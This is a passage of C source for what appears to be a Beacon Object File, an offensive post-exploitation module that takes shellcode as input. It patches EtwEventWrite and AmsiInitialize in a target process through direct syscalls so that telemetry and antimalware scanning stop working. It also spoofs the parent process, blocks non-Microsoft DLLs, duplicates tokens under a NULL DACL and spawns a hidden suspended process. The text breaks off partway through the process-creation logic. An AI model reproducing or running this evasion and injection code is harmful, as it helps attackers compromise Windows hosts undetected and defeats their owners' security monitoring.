#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "syscalls.h"

// --- Async BOF support ---
DECLSPEC_IMPORT void BeaconWakeup();
DECLSPEC_IMPORT HANDLE BeaconGetStopJobEvent();
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);

// --- Definitions ---
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif
#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
#endif
#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000
#endif
#ifndef PROC_THREAD_ATTRIBUTE_HANDLE_LIST
#define PROC_THREAD_ATTRIBUTE_HANDLE_LIST 0x00020002
#endif

typedef struct _MY_STARTUPINFOEXA {
    STARTUPINFOA StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} MY_STARTUPINFOEXA, *PMY_STARTUPINFOEXA;

// --- API Typedefs ---
typedef BOOL (WINAPI *EXP_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *EXP_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef void (WINAPI *EXP_DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef HLOCAL (WINAPI *EXP_LocalAlloc)(UINT, SIZE_T);
typedef HLOCAL (WINAPI *EXP_LocalFree)(HLOCAL);
typedef BOOL (WINAPI *EXP_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI *EXP_SetHandleInformation)(HANDLE, DWORD, DWORD);
typedef BOOL (WINAPI *EXP_PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);

typedef void (WINAPI *EXP_Sleep)(DWORD);

// --- Helpers ---
#pragma optimize("", off) 
void * _memset(void *dest, int c, size_t count) {
    char *bytes = (char *)dest;
    while (count--) {
        *bytes++ = (char)c;
    }
    return dest;
}
#pragma optimize("", on)

int _strlen(const char* s) {
    int len = 0;
    while (s[len]) len++;
    return len;
}

// --- Imports ---
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
typedef BOOL (WINAPI *EXP_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *EXP_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL (WINAPI *EXP_CreateProcessAsUserA)(HANDLE, LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *EXP_InitializeSecurityDescriptor)(PSECURITY_DESCRIPTOR, DWORD);
typedef BOOL (WINAPI *EXP_SetSecurityDescriptorDacl)(PSECURITY_DESCRIPTOR, BOOL, PACL, BOOL);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
WINBASEAPI BOOL WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateNamedPipeA(LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(VOID);

void simple_hex(char* buf, unsigned int val) {
    char* map = "0123456789ABCDEF";
    buf[0] = '\\'; buf[1] = '\\'; buf[2] = '.'; buf[3] = '\\';
    buf[4] = 'p'; buf[5] = 'i'; buf[6] = 'p'; buf[7] = 'e'; buf[8] = '\\';
    buf[9] = 'd'; buf[10] = 'n'; buf[11] = 't'; buf[12] = '_';
    int idx = 13;
    for(int i=7; i>=0; i--) {
        buf[idx++] = map[(val >> (i*4)) & 0xF];
    }
    buf[idx] = 0;
}


BOOL PatchETW(HANDLE hProcess) {
    // x64: xor eax, eax; ret (33 C0 C3) or just ret (C3)
    // We'll use ret (0xC3) for x64
    // x86: ret 14h (C2 14 00)
    
    unsigned char patch64[] = { 0xC3 }; // x64 ret
    unsigned char* patch = patch64;
    SIZE_T patchSize = 1;

#ifdef _M_IX86
    unsigned char patch86[] = { 0xC2, 0x14, 0x00 }; // ret 14
    patch = patch86;
    patchSize = 3;
#endif

    // Resolve EtwEventWrite - this is in ntdll.dll usually
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if(!hNtdll) return FALSE;
    
    void* pEtwEventWrite = (void*)KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");
    if(!pEtwEventWrite) return FALSE;

    PVOID baseAddr = pEtwEventWrite;
    SIZE_T regionSize = patchSize;
    ULONG oldProtect = 0;

    // 1. Change Protections (NtProtectVirtualMemory)
    NTSTATUS status = NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ETW Patch: NtProtectVirtualMemory failed with status: 0x%08x", status);
        return FALSE;
    }

    // 2. Write Patch (NtWriteVirtualMemory)
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, pEtwEventWrite, patch, patchSize, &bytesWritten);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ETW Patch: NtWriteVirtualMemory failed with status: 0x%08x", status);
        return FALSE;
    }

    // 3. Restore Protections
    ULONG tempProtect = 0;
    NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, oldProtect, &tempProtect);
    
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW Patched via Syscalls");
    return TRUE;
}

BOOL ForceLoadAMSI(HANDLE hProcess) {
    HMODULE hKernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    if(!hKernel32) return FALSE;

    void* pLoadLibraryA = (void*)KERNEL32$GetProcAddress(hKernel32, "LoadLibraryA");
    void* pSleep = (void*)KERNEL32$GetProcAddress(hKernel32, "Sleep");
    
    if(!pLoadLibraryA) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ForceLoadAMSI: LoadLibraryA not found");
        return FALSE;
    }

    char* dllName = "amsi.dll";
    SIZE_T dllNameLen = _strlen(dllName) + 1;
    PVOID remoteAddr = NULL;
    SIZE_T regionSize = dllNameLen;

    // Allocate memory for DLL name
    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(!NT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] ForceLoadAMSI: NtAllocateVirtualMemory failed: 0x%08x", status);
         return FALSE;
    }

    // Write DLL name
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, remoteAddr, dllName, dllNameLen, &bytesWritten);
    if(!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ForceLoadAMSI: NtWriteVirtualMemory failed: 0x%08x", status);
        return FALSE;
    }

    // Create Thread to Load Library
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pLoadLibraryA, remoteAddr, 0, 0, 0, 0, NULL);
    if(!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ForceLoadAMSI: NtCreateThreadEx failed: 0x%08x", status);
        return FALSE;
    }

    // Wait for it to load (simple sleep for now)
    if(pSleep) ((void(*)(DWORD))pSleep)(500); 

    KERNEL32$CloseHandle(hThread);
    
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ForceLoadAMSI: Triggered LoadLibraryA('amsi.dll')");
    return TRUE;
}

BOOL PatchAMSI(HANDLE hProcess) {
    // Strategy: Patch AmsiInitialize.
    // Use E_FAIL (0x80004005) to fail initialization gracefully.
    // Patch: mov eax, 0x80004005; ret (B8 05 40 00 80 C3)
    
    unsigned char patch64[] = { 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3 };
    unsigned char* patch = patch64;
    SIZE_T patchSize = 6;

#ifdef _M_IX86
    unsigned char patch86[] = { 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC2, 0x18, 0x00 };
    patch = patch86;
    patchSize = 8;
#endif

    // Load local amsi.dll to find offset (Assume shared ASLR)
    HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
    if(!hAmsi) {
        BeaconPrintf(CALLBACK_ERROR, "[!] PatchAMSI: Could not load local amsi.dll");
        return FALSE;
    }
    
    // Changing target to AmsiInitialize
    void* pAmsiUnk = (void*)KERNEL32$GetProcAddress(hAmsi, "AmsiInitialize");
    if(!pAmsiUnk) {
        BeaconPrintf(CALLBACK_ERROR, "[!] PatchAMSI: Could not find AmsiInitialize");
        return FALSE;
    }

    PVOID baseAddr = pAmsiUnk;
    SIZE_T regionSize = patchSize;
    ULONG oldProtect = 0;

    // 1. Change Protections
    NTSTATUS status = NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!NT_SUCCESS(status)) {
        // This is expected if AMSI is not loaded in target
        BeaconPrintf(CALLBACK_ERROR, "[!] PatchAMSI: NtProtectVirtualMemory failed (0x%08x). AMSI likely not loaded.", status);
        return FALSE;
    }

    // 2. Write Patch
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, pAmsiUnk, patch, patchSize, &bytesWritten);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] PatchAMSI: NtWriteVirtualMemory failed (0x%08x)", status);
        return FALSE;
    }

    // 3. Restore Protections
    ULONG tempProtect = 0;
    NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, oldProtect, &tempProtect);
    
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI Patched via Syscalls");
    return TRUE;
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    int ppid = BeaconDataInt(&parser);
    char* program = BeaconDataExtract(&parser, NULL);
    char* pipeName = BeaconDataExtract(&parser, NULL);  // Pipe name for PPID mode
    int shellcode_len = 0;
    char* shellcode = BeaconDataExtract(&parser, &shellcode_len);
    int useToken = BeaconDataInt(&parser);

    HMODULE hKernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    if(!hKernel32) return;

    EXP_Sleep pSleep = (EXP_Sleep)KERNEL32$GetProcAddress(hKernel32, "Sleep");

    // Initialize Syscalls (Halo's Gate)
    InitSyscalls();

    EXP_InitializeProcThreadAttributeList pInitializeProcThreadAttributeList = (EXP_InitializeProcThreadAttributeList)KERNEL32$GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
    EXP_UpdateProcThreadAttribute pUpdateProcThreadAttribute = (EXP_UpdateProcThreadAttribute)KERNEL32$GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
    EXP_DeleteProcThreadAttributeList pDeleteProcThreadAttributeList = (EXP_DeleteProcThreadAttributeList)KERNEL32$GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
    EXP_LocalAlloc pLocalAlloc = (EXP_LocalAlloc)KERNEL32$GetProcAddress(hKernel32, "LocalAlloc");
    EXP_LocalFree pLocalFree = (EXP_LocalFree)KERNEL32$GetProcAddress(hKernel32, "LocalFree");
    EXP_CreatePipe pCreatePipe = (EXP_CreatePipe)KERNEL32$GetProcAddress(hKernel32, "CreatePipe");
    EXP_SetHandleInformation pSetHandleInformation = (EXP_SetHandleInformation)KERNEL32$GetProcAddress(hKernel32, "SetHandleInformation");
    // EXP_ReadFile pReadFile = (EXP_ReadFile)KERNEL32$GetProcAddress(hKernel32, "ReadFile");


    if(!pInitializeProcThreadAttributeList || !pUpdateProcThreadAttribute) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve API symbols.");
        return;
    }

    // --- RUNNING ---
    if(!program || !shellcode) {
        BeaconPrintf(CALLBACK_ERROR, "Missing program or shellcode.");
        return;
    }



    // 2. Setup Pipes ---
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    HANDLE hStdInRead = NULL;
    HANDLE hStdInWrite = NULL;
    
    // Determine mode
    BOOL useParent = (ppid > 0);
    BOOL usePipeClient = FALSE;

    if (useParent && pipeName && pipeName[0] != '\0') {
        usePipeClient = TRUE;
    }

    if (usePipeClient) {
        // --- PPID / Pipe Client Mode ---
        // We only create the Server end. The Child (stub) will connect as Client.
        
        hReadPipe = KERNEL32$CreateNamedPipeA(
            pipeName,
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1,
            4096,
            4096,
            0,
            NULL
        );
        
        if (hReadPipe == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe(%s) failed: %d", pipeName, KERNEL32$GetLastError());
            return;
        }

    } else {
        // --- Standard Mode ---
        // We create Server + Client handles for inheritance.
        
        char localPipeName[64];
        char* effectivePipeName = pipeName;
        
        if (!pipeName || pipeName[0] == '\0') {
            unsigned int tick = KERNEL32$GetTickCount();
            simple_hex(localPipeName, tick); 
            effectivePipeName = localPipeName;
        }

        hReadPipe = KERNEL32$CreateNamedPipeA(
            effectivePipeName,
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1,
            4096,
            4096,
            0,
            NULL
        );

        if (hReadPipe == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe failed: %d", KERNEL32$GetLastError());
            return;
        }
        
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        hWritePipe = KERNEL32$CreateFileA(
            effectivePipeName,
            GENERIC_WRITE,
            0,
            &sa,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hWritePipe == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "CreateFile(Pipe) failed: %d", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hReadPipe);
            return;
        }

        // Input Pipe (Anonymous)
        if (!pCreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
             BeaconPrintf(CALLBACK_ERROR, "CreatePipe(In) failed: %d", KERNEL32$GetLastError());
             KERNEL32$CloseHandle(hReadPipe);
             KERNEL32$CloseHandle(hWritePipe);
             return;
        }
        pSetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
    }

    PROCESS_INFORMATION pi;
    MY_STARTUPINFOEXA si_ex;
    STARTUPINFOA si_plain;
    LPSTARTUPINFOA si_ptr = NULL;
    DWORD creationFlags = CREATE_SUSPENDED;
    
    _memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    _memset(&si_ex, 0, sizeof(MY_STARTUPINFOEXA));
    _memset(&si_plain, 0, sizeof(STARTUPINFOA));

    HANDLE hParent = NULL;
    DWORD attributeCount = 0;
    BOOL useBlockDLLs = 1; 

    // Handle Attributes for PPID or Normal Mode
    if(usePipeClient) {
         // Open parent process
        hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
        if(!hParent) {
            BeaconPrintf(CALLBACK_ERROR, "OpenProcess(PPID %d) failed: %d", ppid, KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hReadPipe);
            return;
        }
        
        attributeCount = 1;  // PARENT_PROCESS
        if(useBlockDLLs) attributeCount++; 
    } else if(!usePipeClient) {
        // Normal mode - use BlockDLLs
        if(useBlockDLLs) attributeCount++;
    }

#ifndef PROC_THREAD_ATTRIBUTE_HANDLE_LIST
#define PROC_THREAD_ATTRIBUTE_HANDLE_LIST 0x00020002
#endif

    if(usePipeClient) {
        // PPID mode with pipe client - no handle redirection in STARTUPINFO
        si_ex.StartupInfo.cb = sizeof(MY_STARTUPINFOEXA);
        si_ex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;  // No STARTF_USESTDHANDLES!
        si_ex.StartupInfo.wShowWindow = SW_HIDE;
        si_ptr = (LPSTARTUPINFOA)&si_ex;
        creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
        
        SIZE_T attributeSize = 0;
        pInitializeProcThreadAttributeList(NULL, attributeCount, 0, &attributeSize);
        si_ex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)pLocalAlloc(LPTR, attributeSize);
        if(!si_ex.lpAttributeList || !pInitializeProcThreadAttributeList(si_ex.lpAttributeList, attributeCount, 0, &attributeSize)) {
            BeaconPrintf(CALLBACK_ERROR, "InitAttribList failed: %d", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hParent);
            KERNEL32$CloseHandle(hReadPipe);
            return;
        }
        
        // Set PARENT_PROCESS
        if(!pUpdateProcThreadAttribute(si_ex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "UpdateAttrib(Parent) failed: %d", KERNEL32$GetLastError());
        }

        // Set BlockDLLs if enabled
        if(useBlockDLLs) {
            DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
            if(!pUpdateProcThreadAttribute(si_ex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL)) {
                 BeaconPrintf(CALLBACK_ERROR, "UpdateAttrib(BlockDLLs) failed: %d", KERNEL32$GetLastError());
            }
        }
    } else if(attributeCount > 0) {
        // Normal mode with BlockDLLs
        si_ex.StartupInfo.cb = sizeof(MY_STARTUPINFOEXA);
        si_ex.StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si_ex.StartupInfo.wShowWindow = SW_HIDE;
        si_ex.StartupInfo.hStdOutput = hWritePipe;
        si_ex.StartupInfo.hStdError = hWritePipe;
        si_ex.StartupInfo.hStdInput = hStdInRead;
        si_ptr = (LPSTARTUPINFOA)&si_ex;
        creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
        
        // Ensure handles are inheritable
        pSetHandleInformation(hWritePipe, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        pSetHandleInformation(hStdInRead, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        
        SIZE_T attributeSize = 0;
        pInitializeProcThreadAttributeList(NULL, attributeCount, 0, &attributeSize);
        si_ex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)pLocalAlloc(LPTR, attributeSize);
        if(!si_ex.lpAttributeList || !pInitializeProcThreadAttributeList(si_ex.lpAttributeList, attributeCount, 0, &attributeSize)) {
            BeaconPrintf(CALLBACK_ERROR, "InitAttribList failed: %d", KERNEL32$GetLastError());
            return;
        }

        if(useBlockDLLs) {
            DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
            if(!pUpdateProcThreadAttribute(si_ex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL)) {
                 BeaconPrintf(CALLBACK_ERROR, "UpdateAttrib(BlockDLLs) failed: %d", KERNEL32$GetLastError());
            }
        }
    } else {
        // Fallback - no attributes
        si_plain.cb = sizeof(STARTUPINFOA);
        si_plain.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si_plain.wShowWindow = SW_HIDE;
        si_plain.hStdOutput = hWritePipe;
        si_plain.hStdError = hWritePipe;
        si_plain.hStdInput = hStdInRead;
        si_ptr = &si_plain;
    }

    // CreateProcess Logic
    // We want to use CreateProcessAsUserA with a duplicated, permissive (NULL DACL) token 
    // to ensure the child process has full rights to manage its own token (avoiding Access Denied on AdjustTokenPrivileges).

    HANDLE hDupToken = NULL;
    HMODULE hAdvapi32 = KERNEL32$LoadLibraryA("advapi32.dll");
    
    typedef BOOL (WINAPI *EXP_CreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    typedef int (WINAPI *EXP_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
    typedef BOOL (WINAPI *EXP_AdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
    typedef BOOL (WINAPI *EXP_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
    typedef BOOL (WINAPI *EXP_OpenThreadToken)(HANDLE, DWORD, BOOL, PHANDLE);
    typedef HANDLE (WINAPI *EXP_GetCurrentThread)();

    EXP_CreateProcessWithTokenW pCreateProcessWithTokenW = NULL;
    EXP_MultiByteToWideChar pMultiByteToWideChar = (EXP_MultiByteToWideChar)KERNEL32$GetProcAddress(hKernel32, "MultiByteToWideChar");
    EXP_AdjustTokenPrivileges pAdjustTokenPrivileges = NULL;
    EXP_LookupPrivilegeValueA pLookupPrivilegeValueA = NULL;
    
    // Resolve APIs
    if (hAdvapi32) {
         EXP_OpenProcessToken pOpenProcessToken = (EXP_OpenProcessToken)KERNEL32$GetProcAddress(hAdvapi32, "OpenProcessToken");
         EXP_DuplicateTokenEx pDuplicateTokenEx = (EXP_DuplicateTokenEx)KERNEL32$GetProcAddress(hAdvapi32, "DuplicateTokenEx");
         EXP_InitializeSecurityDescriptor pInitializeSecurityDescriptor = (EXP_InitializeSecurityDescriptor)KERNEL32$GetProcAddress(hAdvapi32, "InitializeSecurityDescriptor");
         EXP_SetSecurityDescriptorDacl pSetSecurityDescriptorDacl = (EXP_SetSecurityDescriptorDacl)KERNEL32$GetProcAddress(hAdvapi32, "SetSecurityDescriptorDacl");
         
         EXP_OpenThreadToken pOpenThreadToken = (EXP_OpenThreadToken)KERNEL32$GetProcAddress(hAdvapi32, "OpenThreadToken");
         EXP_GetCurrentThread pGetCurrentThread = (EXP_GetCurrentThread)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetCurrentThread");

         pCreateProcessWithTokenW = (EXP_CreateProcessWithTokenW)KERNEL32$GetProcAddress(hAdvapi32, "CreateProcessWithTokenW");
         pAdjustTokenPrivileges = (EXP_AdjustTokenPrivileges)KERNEL32$GetProcAddress(hAdvapi32, "AdjustTokenPrivileges");
         pLookupPrivilegeValueA = (EXP_LookupPrivilegeValueA)KERNEL32$GetProcAddress(hAdvapi32, "LookupPrivilegeValueA");
         
         if (pOpenProcessToken && pDuplicateTokenEx && pInitializeSecurityDescriptor && pSetSecurityDescriptorDacl) {
             HANDLE hCurrentToken = NULL;
             BOOL tokenFound = FALSE;
             
             // 1. Try to open the Thread Token first (Impersonation) - ONLY IF REQUESTED
             if (useToken && pOpenThreadToken && pGetCurrentThread) {
                 if (pOpenThreadToken(pGetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hCurrentToken)) {
                     tokenFound = TRUE;
                     // BeaconPrintf(CALLBACK_OUTPUT, "[*] Using Impersonation Token (Explicitly Requested)");
                 } else {
                     BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open Thread Token, falling back to Process Token.");
                 }
             }

              // 2. Fallback to Process Token (if not requested or failed)
             if (!tokenFound) {
                 // Use pseudo-handle for current process
                 if (pOpenProcessToken((HANDLE)-1, TOKEN_ALL_ACCESS, &hCurrentToken)) {
                     tokenFound = TRUE;
                     // BeaconPrintf(CALLBACK_OUTPUT, "[*] Using Process Token");
                 }
             }
             
             if (tokenFound && hCurrentToken) {
                 // Explicitly Enable Privileges if we are using an Impersonation Token (or requested to use token)
                 // This logic helps CreateProcessWithTokenW succeed.
                 if (useToken && pAdjustTokenPrivileges && pLookupPrivilegeValueA) {
                     // Inline SetPrivilege logic
                     TOKEN_PRIVILEGES tp;
                     LUID luid;
                     
                     if (pLookupPrivilegeValueA(NULL, "SeImpersonatePrivilege", &luid)) {
                         tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                         pAdjustTokenPrivileges(hCurrentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
                     }
                     if (pLookupPrivilegeValueA(NULL, "SeAssignPrimaryTokenPrivilege", &luid)) {
                         tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                         pAdjustTokenPrivileges(hCurrentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
                     }
                      if (pLookupPrivilegeValueA(NULL, "SeIncreaseQuotaPrivilege", &luid)) {
                         tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                         pAdjustTokenPrivileges(hCurrentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
                     }
                 }

                 // Create a permissive security descriptor (NULL DACL)
                 SECURITY_DESCRIPTOR sd;
                 pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
                 pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
                 
                 SECURITY_ATTRIBUTES saToken;
                 saToken.nLength = sizeof(SECURITY_ATTRIBUTES);
                 saToken.lpSecurityDescriptor = &sd;
                 saToken.bInheritHandle = TRUE; // Token handle itself is inheritable? Doesn't matter much for CreateProcessAsUser

                 pDuplicateTokenEx(hCurrentToken, TOKEN_ALL_ACCESS, &saToken, SecurityImpersonation, TokenPrimary, &hDupToken);
                 KERNEL32$CloseHandle(hCurrentToken);
             }
         }
    }

    BOOL processSuccess = FALSE;
    BOOL bInheritHandles = !usePipeClient; // TRUE for standard, FALSE for pipe client (PPID)

    if (hDupToken && hAdvapi32) {
        
        // Try CreateProcessWithTokenW first if we have a duplicated token (preferred for Impersonation)
        if (useToken && pCreateProcessWithTokenW && pMultiByteToWideChar) {
            
            // Convert Program and Args to WideChar
            int progLen = pMultiByteToWideChar(CP_ACP, 0, program, -1, NULL, 0);
            LPWSTR wProgram = (LPWSTR)pLocalAlloc(LPTR, progLen * sizeof(WCHAR));
            pMultiByteToWideChar(CP_ACP, 0, program, -1, wProgram, progLen);

            STARTUPINFOW siw;
            _memset(&siw, 0, sizeof(STARTUPINFOW));
            siw.cb = sizeof(STARTUPINFOW);
            
            // Map startup info from ANSI to Wide (basic mapping)
            if (si_ptr) {
                 siw.dwFlags = si_ptr->dwFlags;
                 siw.wShowWindow = si_ptr->wShowWindow;
                 siw.hStdInput = si_ptr->hStdInput;
                 siw.hStdOutput = si_ptr->hStdOutput;
                 siw.hStdError = si_ptr->hStdError;
            }

            // Note: CreateProcessWithTokenW does NOT support EXTENDED_STARTUPINFO_PRESENT
            // So we strip that flag if present, meaning PPID spoofing might not work with this API.
            DWORD dwCreationFlagsW = creationFlags & ~EXTENDED_STARTUPINFO_PRESENT;

            // LOGON_WITH_PROFILE = 0x00000001
            processSuccess = pCreateProcessWithTokenW(hDupToken, 0x00000001, NULL, wProgram, dwCreationFlagsW, NULL, NULL, &siw, &pi);
            
            pLocalFree(wProgram);
        }
    
        // Fallback to CreateProcessAsUserA
        if (!processSuccess) {
            EXP_CreateProcessAsUserA pCreateProcessAsUserA = (EXP_CreateProcessAsUserA)KERNEL32$GetProcAddress(hAdvapi32, "CreateProcessAsUserA");
            if (pCreateProcessAsUserA) {
                 processSuccess = pCreateProcessAsUserA(hDupToken, NULL, program, NULL, NULL, bInheritHandles, creationFlags, NULL, NULL, si_ptr, &pi);
            } else {
                 // Fallback
                 processSuccess = KERNEL32$CreateProcessA(NULL, program, NULL, NULL, bInheritHandles, creationFlags, NULL, NULL, si_ptr, &pi);
            }
        }
        KERNEL32$CloseHandle(hDupToken);
    } else {
